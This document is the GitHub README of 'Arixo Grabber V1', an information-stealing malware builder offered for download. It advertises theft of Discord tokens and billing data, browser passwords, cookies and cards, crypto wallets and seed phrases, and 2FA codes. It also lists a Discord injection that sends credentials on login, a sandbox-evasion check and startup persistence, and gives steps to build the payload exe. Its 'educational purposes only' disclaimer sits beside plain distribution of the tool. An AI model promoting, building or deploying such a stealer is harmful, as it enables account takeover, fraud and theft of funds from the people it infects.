
  <h1 align="center">
  Arixo Grabber V1
</h1>


<div align="center">
  <img  src="https://user-images.githubusercontent.com/99215486/175369409-b967da5b-e373-48ea-b8f5-8ed3d613df03.gif">
  <br>
<br>
  <img  src="https://img.shields.io/github/downloads/ArianPashae/Arixo-Grabber-V1/total?color=6d00c1">
  <img  src="https://img.shields.io/github/stars/ArianPashae/Arixo-Grabber-V1?color=6d00c1&logoColor=6d00c1">
  <img  src="https://img.shields.io/github/forks/ArianPashae/Arixo-Grabber-V1?logoColor=6d00c1">
  <br>
  <img  src="https://img.shields.io/github/commit-activity/w/ArianPashae/Arixo-Grabber-V1?color=6d00c1">
  <img  src="https://img.shields.io/github/last-commit/ArianPashae/Arixo-Grabber-V1?color=6d00c1&logoColor=6d00c1">
  <img  src="https://img.shields.io/github/license/ArianPashae/Arixo-Grabber-V1?color=6d00c1">
  <br>
  <img  src="https://img.shields.io/github/issues/ArianPashae/Arixo-Grabber-V1?color=6d00c1&logoColor=6d00c1">
  <img  src="https://img.shields.io/github/issues-closed/ArianPashae/Arixo-Grabber-V1?color=6d00c1&logoColor=6d00c1">
  <br>
<br>
<div align="center"> 
  <a href="https://instagram.com/arianpashae" target="_blank">
    <img src="https://img.shields.io/static/v1?message=instagram&logo=instagram&label=&color=E4405F&logoColor=white&labelColor=&style=flat" height="35" alt="instagram logo"  /></a>
  <a href="https://discordapp.com/users/941442983084040222%20" target="_blank">
    <img src="https://img.shields.io/static/v1?message=Discord&logo=discord&label=&color=7289DA&logoColor=white&labelColor=&style=flat" height="35" alt="discord logo"  />
  </a>
  <a href="http://www.linkedin.com/in/arian-pashae/" target="_blank">
      <img src="https://img.shields.io/static/v1?message=LinkedIn&logo=linkedin&label=&color=0077B5&logoColor=white&labelColor=&style=flat" height="35" alt="linkedin logo"  />
  </a>
<br>
  <a href="https://t.me/ArianPashae" target="_blank">
    <img src="https://img.shields.io/static/v1?message=Telegram&logo=telegram&label=&color=2CA5E0&logoColor=white&labelColor=&style=flat" height="35" alt="telegram logo"  />
  </a>
  <a href="https://wa.link/8x8t9x" target="_blank">
    <img src="https://img.shields.io/static/v1?message=Whatsapp&logo=whatsapp&label=&color=25D366&logoColor=white&labelColor=&style=flat" height="35" alt="whatsapp logo"  />
  </a>
  <a href="mailto:info@arianpashae.com" target="_blank">
    <img src="https://img.shields.io/static/v1?message=Gmail&logo=gmail&label=&color=D14836&logoColor=white&labelColor=&style=flat" height="35" alt="gmail logo"  />
  </a>
<a href="https://x.com/arianpashae" target="_blank">
    <img src="https://img.shields.io/static/v1?message=Follow&logo=X&label=&color=black&logoColor=white&labelColor=&style=flat" height="35" alt="x logo"  />
  </a>
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
  </div>
</div>
    
## Features

-   Discord Information
    -   Nitro
    -   Badges
    -   Billing
    -   Email
    -   Phone
    -   HQ Friends
    -   HQ Guilds
    -   Gift Codes
      
-   Browser Data
    -   Cookies
    -   Passwords
    -   Histories
    -   Autofills
    -   Bookmarks
    -   Credit/Debit Cards
    -   From Chrome, Edge, Brave, Opera GX, and many more...
      
-   Crypto Data
    -   Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet and +40 wallets supported)
    -   Softwares (Exodus, Atomic, Guarda, Electrum, Zcash, Armory, Binance, Coinomi)
    -   Seedphrases and backup codes
      
-   Application Data
    -   Steam
    -   Riot Games
    -   Telegram
      
-   Discord Injection
    - Send token, password, email and billing on login or when email/password is changed
      
-   System Information
    -   User
    -   System
    -   Disk
    -   Network
      
-   File Stealer
    -   Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes
      
-   General Functions
    -   Check if being run in a VirusTotal sandbox
    -   Adds file to startup

## Compatibility

| Browsers           | Browser Data | Crypto Data | Token Grab |
| :-----------:      | :-----------: | :-----------: | :-----------: |
| Chrome             | ✅ | ✅ | ✅ |
| Edge               | ✅ | ✅ | ✅ |
| Brave              | ✅ | ✅ | ✅ |
| Opera (GX)         | ✅ | ✅ | ✅ |
| Opera              | ✅ | ✅ | ✅ |
| Yandex             | ✅ | ✅ | ✅ |
| Firefox            | ❌ | ❌ | ❌ |

## Install

### Prerequisites

-   Windows 10/11
-   [Python](https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe)
-   [Git](https://git-scm.com/download/win)

### Setup

1. [Download source code zip](https://github.com/ArianPashae/Arixo-Grabber-V1/archive/refs/heads/master.zip)
2. Extract zip
3. First install reqiured packages by double clicking `install.bat` file
4. Run the builder by double clicking the `builder.pyw` file
5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `Arixo.exe`

<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/ArianPashae/Arixo-Grabber-V1/master/Arixo_assets/img/ss1.png"></img>
    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/ArianPashae/Arixo-Grabber-V1/master/Arixo_assets/img/ss2.png"></img>
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/ArianPashae/Arixo-Grabber-V1/master/Arixo_assets/img/ss3.png"></img>
  <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/ArianPashae/Arixo-Grabber-V1/master/Arixo_assets/img/sss4.png"></img>
    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%"> 
  
</div>

> [!CAUTION]
> This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>

> [!WARNING]
> By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

<a href=#top>Back to Top</a></p>
